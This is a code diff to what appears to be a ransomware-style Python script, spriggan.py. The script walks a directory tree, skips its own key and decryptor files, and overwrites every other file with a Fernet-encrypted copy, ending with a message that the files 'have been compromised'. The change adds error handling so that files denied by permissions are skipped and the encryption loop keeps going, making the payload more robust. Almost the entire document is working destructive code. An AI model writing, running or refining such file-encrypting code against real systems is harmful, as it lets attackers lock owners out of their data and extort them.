@@ -48,19 +48,30 @@ if "y" in choice:
             # Omite "setup.py" y "key.key"
             if file not in ["spriggan.py", "key.key", "decrypt.py"]:
 
-                filePath = os.path.join(root, file)
+                try:
 
-                contents = open(filePath, "rb").read()
-                f = Fernet(key)
+                    filePath = os.path.join(root, file)
 
-                contents = f.encrypt(contents)
+                    contents = open(filePath, "rb").read()
+                    f = Fernet(key)
 
-                with open(filePath, "wb") as targetFile:
-                    targetFile.write(contents)
+                    contents = f.encrypt(contents)
+
+                    with open(filePath, "wb") as targetFile:
+                        targetFile.write(contents)
             
-                print(termcolor.colored("Encrypting " + str(file), color="yellow"))
+                    print(termcolor.colored("Encrypting " + str(file), color="yellow"))
 
-                fileCount = fileCount + 1
+                    fileCount = fileCount + 1
+
+                except Exception as error:
+                    
+                    if isinstance(error, PermissionError):
+                        print(termcolor.colored("ERROR: " + str(file) + " could not be encrypted, PERMISSION DENIED!", color="red", attrs=["bold"]))
+                    else:
+                        print(termcolor.colored("ERROR: " + str(file) + " could not be encrypted, " + type(error).__name__, color="red", attrs=["bold"]))
+
+
 
 
     print(termcolor.colored("\nEncryption successful, " + str(fileCount) + " files have been compromised", color="green", attrs=["bold"]))
@@ -68,5 +79,3 @@ if "y" in choice:
 
 else:
     print(termcolor.colored("\nQUITTING! \n", color="red", attrs=["bold"]))
-
-
